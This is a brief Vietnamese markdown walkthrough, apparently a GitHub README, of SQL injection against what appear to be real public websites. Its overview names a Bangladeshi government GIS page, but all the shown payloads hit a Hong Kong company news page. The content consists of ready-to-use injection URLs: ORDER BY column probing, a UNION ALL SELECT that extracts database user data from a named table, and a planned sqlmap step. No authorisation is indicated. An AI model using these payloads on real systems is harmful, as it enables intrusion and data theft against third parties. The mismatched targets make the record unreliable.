# TỔNG QUAN # 

Kiểm tra trên web "BGISP" `http://www.gis.gov.bd/en/gis_file.php?id=9`


## CÁC BƯỚC

* [Dò tìm số cột](#dò-tìm-số-cột)
* [Kiểm tra database, version, user](#kiểm-tra-database-version-user)
* [Trích xuất cơ sở dữ liệu](#trích-xuất-cơ-sở-dữ-liệu)
* [Sử dụng `sqlmap`](#sử-dụng-sqlmap)

## Dò tìm số cột

http://www.cmkoo.com.hk/en/news/news.php?id=28+ORDER+BY+1

![image](https://github.com/user-attachments/assets/a84108f8-bb63-4406-97da-9aacbbc9ec96)

http://www.cmkoo.com.hk/en/news/news.php?id=28+ORDER+BY+20

![image](https://github.com/user-attachments/assets/cdf0c4bd-a4b1-4b35-a12b-a3438af00070)

http://www.cmkoo.com.hk/en/news/news.php?id=28+ORDER+BY+16

![image](https://github.com/user-attachments/assets/d238751e-d552-4ec0-a288-b0470fc9d980)


## Kiểm tra database, version, user 

![image](https://github.com/user-attachments/assets/d160197b-a4a3-4077-8618-8ad9c1603151)

`http://www.cmkoo.com.hk/en/news/news.php?id=28+UNION+ALL+SELECT+1,2,3,4,user,6,7,8,9,10,11,12,13,14,15,16+from+user.cmkoo_com_hk`

![image](https://github.com/user-attachments/assets/c526f1a8-0a8e-4fd3-a7ce-45cd9828ccb4)
